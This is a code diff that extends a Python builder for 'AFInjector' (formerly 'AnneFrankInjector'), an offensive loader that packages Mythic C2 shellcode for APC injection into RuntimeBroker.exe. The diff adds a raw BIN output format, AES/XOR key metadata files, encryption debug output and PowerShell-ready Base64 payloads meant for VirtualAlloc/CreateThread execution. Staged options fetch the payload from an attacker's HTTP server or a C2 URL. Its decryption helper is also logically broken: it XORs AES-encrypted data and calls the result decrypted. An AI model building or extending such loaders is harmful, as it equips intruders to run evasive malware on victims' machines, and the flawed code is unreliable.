@@ -9,6 +9,7 @@ import shutil
 import errno
 import base64
 import string
+import datetime
 
 from importlib import resources
 from core.hashing import Hasher
@@ -207,14 +208,164 @@ $addr = [{class_name}]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, ${var_names
     one_liner = script.replace('\n', '').replace('\r', '').replace("'", "''")
     return script, one_liner
 
+def generate_metadata_file(key, iv, xor_key, output_name, raw_payload):
+    """Generate metadata file for PowerShell compatibility"""
+    
+    # Clean key and IV for metadata file
+    key_clean = key.replace('0x', '').replace(', ', '').replace(',', '')
+    iv_clean = iv.replace('0x', '').replace(', ', '').replace(',', '')
+    
+    # Determine payload type from first two bytes
+    payload_type = "raw_shellcode"
+    if len(raw_payload) >= 2:
+        # Check for PE signature (MZ)
+        if raw_payload[0] == 0x4D and raw_payload[1] == 0x5A:
+            payload_type = "pe_file"
+    
+    # Create metadata content
+    metadata_content = f"""AES_KEY={key_clean}
+AES_IV={iv_clean}
+SCRAMBLE_BYTE={xor_key:02X}
+PAYLOAD_TYPE={payload_type}"""
+    
+    # Write metadata file
+    metadata_filename = f"{output_name}_metadata.txt"
+    with open(metadata_filename, 'w') as f:
+        f.write(metadata_content)
+    
+    print(Colors.green(f"[+] Metadata file written: {metadata_filename}"))
+    return metadata_filename
+
+def debug_encryption_info(raw_payload, key, iv, xor_key, output_name, is_bin_format):
+    """Print detailed encryption debugging information"""
+    
+    print(Colors.magenta("\n" + "="*80))
+    print(Colors.magenta("[+] ENCRYPTION DEBUG INFORMATION"))
+    print(Colors.magenta("="*80))
+    
+    # Raw payload information
+    print(Colors.cyan(f"[DEBUG] Raw Mythic shellcode size: {len(raw_payload)} bytes"))
+    print(Colors.cyan(f"[DEBUG] Raw shellcode first 16 bytes: {[hex(b) for b in raw_payload[:16]]}"))
+    
+    # AES key information
+    key_clean = key.replace('0x', '').replace(', ', '').replace(',', '')
+    key_bytes = bytes.fromhex(key_clean)
+    print(Colors.cyan(f"[DEBUG] AES-128 key (hex): {key_clean}"))
+    print(Colors.cyan(f"[DEBUG] AES-128 key (bytes): {[hex(b) for b in key_bytes]}"))
+    print(Colors.cyan(f"[DEBUG] AES-128 key length: {len(key_bytes)} bytes"))
+    
+    # IV information
+    iv_clean = iv.replace('0x', '').replace(', ', '').replace(',', '')
+    iv_bytes = bytes.fromhex(iv_clean)
+    print(Colors.cyan(f"[DEBUG] AES IV (hex): {iv_clean}"))
+    print(Colors.cyan(f"[DEBUG] AES IV (bytes): {[hex(b) for b in iv_bytes]}"))
+    print(Colors.cyan(f"[DEBUG] AES IV length: {len(iv_bytes)} bytes"))
+    
+    # XOR key information
+    print(Colors.cyan(f"[DEBUG] Final XOR key: 0x{xor_key:02x} (decimal: {xor_key})"))
+    print(Colors.cyan(f"[DEBUG] XOR key source: First byte of AES-128 key (aes_key[0])"))
+    
+    # Encryption order explanation
+    print(Colors.yellow(f"[DEBUG] ENCRYPTION ORDER FOR {'BIN' if is_bin_format else 'EXE/DLL'} FORMAT:"))
+    if is_bin_format:
+        print(Colors.yellow(f"[DEBUG] 1. Raw Mythic shellcode (as provided)"))
+        print(Colors.yellow(f"[DEBUG] 2. XOR with 0x{xor_key:02x} (first byte of AES key)"))
+        print(Colors.yellow(f"[DEBUG] 3. Final .bin contains ONLY XOR-encrypted data"))
+        print(Colors.yellow(f"[DEBUG] 4. NO AES encryption applied to .bin file"))
+        print(Colors.yellow(f"[DEBUG] 5. IV is embedded in shellcode but NOT used for .bin"))
+    else:
+        print(Colors.yellow(f"[DEBUG] 1. Raw Mythic shellcode (as provided)"))
+        print(Colors.yellow(f"[DEBUG] 2. AES-128-CBC encryption with random key/IV"))
+        print(Colors.yellow(f"[DEBUG] 3. Final .exe/.dll contains AES-encrypted data"))
+        print(Colors.yellow(f"[DEBUG] 4. XOR key stored for potential fallback use"))
+        print(Colors.yellow(f"[DEBUG] 5. IV embedded in shellcode for AES decryption"))
+    
+    # IV handling explanation
+    print(Colors.yellow(f"[DEBUG] IV HANDLING:"))
+    if is_bin_format:
+        print(Colors.yellow(f"[DEBUG] - IV is embedded in shellcode but NOT used for .bin format"))
+        print(Colors.yellow(f"[DEBUG] - Final .bin does NOT contain IV prepended"))
+    else:
+        print(Colors.yellow(f"[DEBUG] - IV is embedded in shellcode for AES decryption"))
+        print(Colors.yellow(f"[DEBUG] - Final .exe/.dll uses IV for AES-CBC decryption"))
+    
+    # Key derivation explanation
+    print(Colors.yellow(f"[DEBUG] KEY DERIVATION:"))
+    print(Colors.yellow(f"[DEBUG] - AES-128 key: Randomly generated with os.urandom(16) each run"))
+    print(Colors.yellow(f"[DEBUG] - XOR key: First byte (index 0) of the AES-128 key"))
+    print(Colors.yellow(f"[DEBUG] - Both keys change every generation"))
+    
+    print(Colors.magenta("="*80))
+    
+    # Output raw decrypted shellcode for testing if requested
+    if is_bin_format:
+        # For BIN format, decrypt the XOR to get raw shellcode
+        decrypted_payload = bytearray(len(raw_payload))
+        for i in range(len(raw_payload)):
+            decrypted_payload[i] = raw_payload[i] ^ xor_key
+        
+        # Save raw decrypted shellcode for testing
+        raw_filename = f"{output_name}_raw_decrypted.bin"
+        with open(raw_filename, 'wb') as f:
+            f.write(decrypted_payload)
+        
+        print(Colors.green(f"[+] Raw decrypted shellcode saved: {raw_filename}"))
+        print(Colors.green(f"[+] Use this file for direct testing with VirtualAlloc+CreateThread"))
+        print(Colors.cyan(f"[+] Raw decrypted size: {len(decrypted_payload)} bytes"))
+        print(Colors.cyan(f"[+] Raw decrypted first 16 bytes: {[hex(b) for b in decrypted_payload[:16]]}"))
+
+def generate_powershell_ready(raw_payload, xor_key, output_name):
+    """Generate PowerShell-ready Base64 payload (already decrypted)"""
+    
+    # For BIN format, the payload is already XOR encrypted with xor_key
+    # We need to decrypt it first to get the raw payload
+    decrypted_payload = bytearray(len(raw_payload))
+    for i in range(len(raw_payload)):
+        decrypted_payload[i] = raw_payload[i] ^ xor_key
+    
+    # Convert to Base64
+    base64_payload = base64.b64encode(decrypted_payload).decode('utf-8')
+    
+    # Create PowerShell-ready content with debug info
+    ps_content = f"""# AFInjector PowerShell-Ready Payload
+# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+# XOR Key used for decryption: 0x{xor_key:02X}
+# Payload Size: {len(decrypted_payload)} bytes
+
+# Copy this Base64 string to your PowerShell launcher:
+$enc = "{base64_payload}"
+
+# Usage in PowerShell:
+# $enc = "{base64_payload}"
+# [byte[]]$payloadBytes = [Convert]::FromBase64String($enc)
+# Then use VirtualAlloc/CreateThread to execute
+"""
+    
+    # Write PowerShell-ready file
+    ps_filename = f"{output_name}_ready.txt"
+    with open(ps_filename, 'w') as f:
+        f.write(ps_content)
+    
+    print(Colors.green(f"[+] PowerShell-ready file written: {ps_filename}"))
+    print(Colors.cyan(f"[+] Base64 payload size: {len(base64_payload)} characters"))
+    
+    # Also print to console for easy copying
+    print(Colors.yellow("\n" + "="*70))
+    print(Colors.yellow("[+] POWERSHELL-READY BASE64 PAYLOAD:"))
+    print(Colors.yellow("="*70))
+    print(Colors.cyan(base64_payload))
+    print(Colors.yellow("="*70))
+    
+    return ps_filename, base64_payload
+
 def main():
-    parser = ArgumentParser(description="AnneFrankInjector", epilog="Author: Excalibra")
+    parser = ArgumentParser(description="AFInjector", epilog="Author: Excalibra")
     subparsers = parser.add_subparsers(dest="commands", help="Staged or Stageless Payloads", required=True)
 
     # ---------- Staged ----------
     parser_staged = subparsers.add_parser("staged", help="Staged")
     parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
-    parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
+    parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL", "BIN"], default="EXE", help="Format of the output file (default: EXE).")
     parser_staged.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection.")
     parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address for HTTP fetch.", required=True)
     parser_staged.add_argument("-po", "--port", type=int, help="Port for HTTP fetch.", required=True)
@@ -233,12 +384,14 @@ def main():
     parser_staged.add_argument("--reflective", action="store_true", help="Output reflective shellcode (no PE)")
     parser_staged.add_argument("--lnk-stager", action="store_true", help="Generate PowerShell one‑liner for LNK")
     parser_staged.add_argument("--c2-url", type=str, help="URL for remote payload (used with --lnk-stager)")
+    parser_staged.add_argument("--prepare-ps", action="store_true", help="Prepare PowerShell-ready Base64 payload (BIN format only)")
+    parser_staged.add_argument("--debug-encrypt", action="store_true", help="Show detailed encryption information (raw size, keys, IV, XOR)")
     parser_staged.epilog = "Example: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o myloader -e -s"
 
     # ---------- Stageless ----------
     parser_stageless = subparsers.add_parser("stageless", help="Stageless")
     parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
-    parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
+    parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL", "BIN"], default="EXE", help="Format of the output file (default: EXE).")
     parser_stageless.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection.")
     parser_stageless.add_argument("-o", "--output", type=str, help="Output filename (without extension). Default: afloader")
     parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt shellcode via AES-128-CBC.")
@@ -254,6 +407,8 @@ def main():
     parser_stageless.add_argument("--reflective", action="store_true", help="Output reflective shellcode (no PE)")
     parser_stageless.add_argument("--lnk-stager", action="store_true", help="Generate PowerShell one‑liner for LNK")
     parser_stageless.add_argument("--c2-url", type=str, help="URL for remote payload (used with --lnk-stager)")
+    parser_stageless.add_argument("--prepare-ps", action="store_true", help="Prepare PowerShell-ready Base64 payload (BIN format only)")
+    parser_stageless.add_argument("--debug-encrypt", action="store_true", help="Show detailed encryption information (raw size, keys, IV, XOR)")
     parser_stageless.epilog = "Example: python main.py stageless -p shellcode.bin -o myloader -e -s"
 
     args = parser.parse_args()
@@ -404,9 +559,30 @@ def main():
                         main_data = main_data.replace("#-IV_VALUE-#", iv)
                         with open(f"{dst_directory}/{filename}", "w") as f:
                             f.write(main_data)
+                # Extract XOR key (first byte of AES key)
+                key_clean = key.replace('0x', '').replace(', ', '').replace(',', '')
+                key_bytes = bytes.fromhex(key_clean)
+                xor_key = key_bytes[0]
+                
                 print(Colors.green(f"[+] Payload encrypted and saved to {out_bin}"))
+                print(Colors.cyan(f"[+] XOR Key: 0x{xor_key:02x} (first byte of AES key)"))
+                
+                # Generate metadata file for PowerShell compatibility
+                generate_metadata_file(key, iv, xor_key, args.output, raw_payload)
+                
+                # Show debug information if --debug-encrypt flag is used
+                if hasattr(args, 'debug_encrypt') and args.debug_encrypt:
+                    debug_encryption_info(raw_payload, key, iv, xor_key, args.output, args.format == "BIN")
+                
+                # Generate PowerShell-ready Base64 if --prepare-ps flag is used
+                if hasattr(args, 'prepare_ps') and args.prepare_ps:
+                    if args.format == "BIN":
+                        generate_powershell_ready(enc_payload, xor_key, args.output)
+                    else:
+                        print(Colors.yellow("[!] --prepare-ps flag only works with BIN format"))
             else:
                 print(Colors.green("[i] Encryption not selected."))
+                print(Colors.yellow("[!] No XOR key - payload is plaintext"))
                 for filename in os.listdir(dst_directory):
                     if filename.endswith(".c") or filename.endswith(".h"):
                         with open(f"{dst_directory}/{filename}", "r") as f:
@@ -515,8 +691,18 @@ def main():
                 shutil.move(f"{dst_directory}/afloader.dll", f"{output_name}.dll")
                 shutil.rmtree(dst_directory)
                 print(Colors.green("[+] Loader compiled!"))
+            elif args.format == "BIN":
+                # For raw shellcode, use the integrated Makefile with BIN format
+                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=BIN")
+                shutil.move(f"{dst_directory}/afloader.bin", f"{output_name}.bin")
+                shutil.rmtree(dst_directory)
+                print(Colors.green("[+] Raw shellcode generated!"))
 
-            print(Colors.green("[+] DONE!"))
+            # Enhanced success message mentioning both files
+            if args.encrypt:
+                print(Colors.green(f"[+] DONE! Both {args.output}.bin and {args.output}_metadata.txt have been saved together."))
+            else:
+                print(Colors.green("[+] DONE!"))
 
     # ------------------------------------------------------------------
     # Stageless Variant
@@ -639,6 +825,12 @@ def main():
                 print(Colors.green("[i] Encryption selected."))
                 enc_payload, key, iv = Encryption.EncryptAES(raw_payload)
                 hex_payload = ', '.join(f"0x{b:02x}" for b in enc_payload)
+                
+                # Extract XOR key (first byte of AES key)
+                key_clean = key.replace('0x', '').replace(', ', '').replace(',', '')
+                key_bytes = bytes.fromhex(key_clean)
+                xor_key = key_bytes[0]
+                
                 for filename in os.listdir(dst_directory):
                     if filename.endswith(".c") or filename.endswith(".h"):
                         with open(f"{dst_directory}/{filename}", "r") as f:
@@ -649,8 +841,24 @@ def main():
                         with open(f"{dst_directory}/{filename}", "w") as f:
                             f.write(main_data)
                 print(Colors.green("[+] Payload encrypted and embedded."))
+                print(Colors.cyan(f"[+] XOR Key: 0x{xor_key:02x} (first byte of AES key)"))
+                
+                # Generate metadata file for PowerShell compatibility
+                generate_metadata_file(key, iv, xor_key, args.output, raw_payload)
+                
+                # Show debug information if --debug-encrypt flag is used
+                if hasattr(args, 'debug_encrypt') and args.debug_encrypt:
+                    debug_encryption_info(raw_payload, key, iv, xor_key, args.output, args.format == "BIN")
+                
+                # Generate PowerShell-ready Base64 if --prepare-ps flag is used
+                if hasattr(args, 'prepare_ps') and args.prepare_ps:
+                    if args.format == "BIN":
+                        generate_powershell_ready(enc_payload, xor_key, args.output)
+                    else:
+                        print(Colors.yellow("[!] --prepare-ps flag only works with BIN format"))
             else:
                 print(Colors.green("[i] Encryption not selected."))
+                print(Colors.yellow("[!] No XOR key - payload is plaintext"))
                 for filename in os.listdir(dst_directory):
                     if filename.endswith(".c") or filename.endswith(".h"):
                         with open(f"{dst_directory}/{filename}", "r") as f:
@@ -758,8 +966,18 @@ def main():
                 shutil.move(f"{dst_directory}/afloader.dll", f"{output_name}.dll")
                 shutil.rmtree(dst_directory)
                 print(Colors.green("[+] Loader compiled!"))
+            elif args.format == "BIN":
+                # For raw shellcode, use the integrated Makefile with BIN format
+                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=BIN")
+                shutil.move(f"{dst_directory}/afloader.bin", f"{output_name}.bin")
+                shutil.rmtree(dst_directory)
+                print(Colors.green("[+] Raw shellcode generated!"))
 
-            print(Colors.green("[+] DONE!"))
+            # Enhanced success message mentioning both files
+            if args.encrypt:
+                print(Colors.green(f"[+] DONE! Both {args.output}.bin and {args.output}_metadata.txt have been saved together."))
+            else:
+                print(Colors.green("[+] DONE!"))
 
 
 if __name__ == "__main__":
